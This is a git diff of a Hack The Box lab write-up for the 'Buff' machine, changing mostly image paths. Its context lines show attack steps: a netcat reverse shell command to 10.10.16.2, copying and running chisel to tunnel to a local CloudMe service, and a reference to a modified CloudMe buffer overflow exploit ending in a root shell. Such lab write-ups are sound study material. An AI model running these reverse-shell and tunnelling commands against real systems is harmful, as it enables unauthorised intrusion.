@@ -4,6 +4,8 @@ icon: windows
 
 # Buff - Easy
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/buff"><strong>Buff</strong></a></p></figcaption></figure>
+
 ## <mark style="color:blue;">Gaining Access</mark>
 
 Nmap scan:
@@ -109,11 +111,11 @@ C:\users\shaun\nc64.exe -e cmd 10.10.16.2 8080
 
 ### <mark style="color:$primary;">Manual Enumeration</mark>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is an interesting .exe file in shaun's downloads directory!
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 After a quick search there is a POC buffer overflow available for this version!&#x20;
 
@@ -121,7 +123,7 @@ Let's check and see if the application is running on the machine!
 
 Checking netstat shows 2 ports listening on localhost 3306 which is MySQL that is being used by the site hosted on port 8080. But we also see an interesting port 8888 listening on localhost this must be the CloudMe app!
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:$primary;">CloudMe v 1.11.2 Buffer Overflow Privesc</mark>
 
@@ -137,7 +139,7 @@ copy \\10.10.16.2\share\chisel_1.10.1_windows_amd64 c:\users\shaun\chisel_1.10.1
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Setting up the tunnel
 
@@ -145,7 +147,7 @@ Setting up the tunnel
 ./chisel_1.10.1_linux_amd64 server -p 8000 --reverse
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -153,11 +155,11 @@ c:\users\shaun\chisel_1.10.1_windows_amd64.exe client 10.10.16.2:8000 R:8888:loc
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 It's connected! To verify just in case run netst
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### <mark style="color:$primary;">Modifying the exploit</mark>
 
@@ -246,6 +248,6 @@ except Exception as e:
 
 Now to execute it make sure to have a listener ready on port 8080
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 And we got a shell as root!
